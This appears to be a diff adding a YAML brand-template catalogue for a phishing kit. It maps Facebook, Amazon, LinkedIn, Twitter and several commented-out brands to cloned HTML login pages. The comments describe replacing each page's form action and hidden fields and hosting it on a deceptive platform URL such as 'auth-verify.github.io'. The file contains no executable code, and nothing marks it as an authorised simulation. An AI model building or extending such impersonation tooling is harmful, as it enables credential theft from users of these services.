@@ -1,0 +1,60 @@
+# Brand template metadata.
+#
+# Each entry maps to an HTML file in templates/brands/.
+# The HTML file should contain the real login page with these placeholders:
+#
+#   {{FORM_ACTION}}     — replaced with the form submission URL
+#   {{HIDDEN_FIELDS}}   — replaced with hidden <input> elements
+#   {{PLATFORM_URL}}    — replaced with the hosting platform URL (e.g. "auth-verify.github.io")
+#
+# See templates/brands/README.md for detailed instructions.
+
+# google:
+#   html_file: google.html
+#   brand_name: "Google"
+#   real_domains: ["accounts.google.com", "google.com"]
+
+# microsoft:
+#   html_file: microsoft.html
+#   brand_name: "Microsoft"
+#   real_domains: ["login.microsoftonline.com", "microsoft.com"]
+
+# paypal:
+#   html_file: paypal.html
+#   brand_name: "PayPal"
+#   real_domains: ["paypal.com"]
+
+# apple:
+#   html_file: apple.html
+#   brand_name: "Apple"
+#   real_domains: ["apple.com", "icloud.com"]
+
+facebook:
+  html_file: facebook.html
+  brand_name: "Facebook"
+  real_domains: ["facebook.com"]
+
+amazon:
+  html_file: amazon.html
+  brand_name: "Amazon"
+  real_domains: ["amazon.com"]
+
+# instagram:
+#   html_file: instagram.html
+#   brand_name: "Instagram"
+#   real_domains: ["instagram.com"]
+
+linkedin:
+  html_file: linkedin.html
+  brand_name: "LinkedIn"
+  real_domains: ["linkedin.com"]
+
+# netflix:
+#   html_file: netflix.html
+#   brand_name: "Netflix"
+#   real_domains: ["netflix.com"]
+
+twitter:
+  html_file: x.html
+  brand_name: "Twitter"
+  real_domains: ["twitter.com", "x.com"]
